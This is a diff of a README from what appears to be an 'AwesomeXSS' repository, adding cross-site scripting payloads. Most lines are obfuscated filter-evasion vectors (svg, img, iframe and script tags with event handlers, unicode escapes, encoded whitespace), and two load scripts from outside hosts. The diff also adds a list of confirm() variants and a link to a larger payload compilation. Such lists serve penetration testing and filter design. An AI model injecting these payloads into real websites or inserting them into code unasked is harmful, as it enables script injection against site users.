@@ -54,22 +54,38 @@ Put this repo on watch. I will be updating it regularly.
 
 ### Awesome Payloads
 ```
+<--`<img/src=` onerror=alert(1)> --!>
 <svg%0Aonload=%09((pro\u006dpt))()//
 <sCript x>(((confirm)))``</scRipt x>
 <svg/x=">"/onload=confirm()//
+<svg </onload ="1> (_=prompt,_(1)) "">
 <embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
 <x oncut=alert()>x
 <details ontoggle=confirm()>
+<svg onload=write()>
+<script y="><">/*<script* */prompt()</script
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
 ```
 
+### Awesome Confirm Variants
+Yep, confirm because alert is too mainstream.
+```
+confirm()
+confirm``
+(((confirm)))``
+new class extends confirm``{}
+```
+
 ### Awesome Exploits
-Come back later
+A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)
 
 ### Awesome Tags & Event Handlers
 - [List of all Event Handlers](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
 
-#### HTML Tags that you will be using
+Most used HTML Tags that you will be using
 ```
 img
 svg
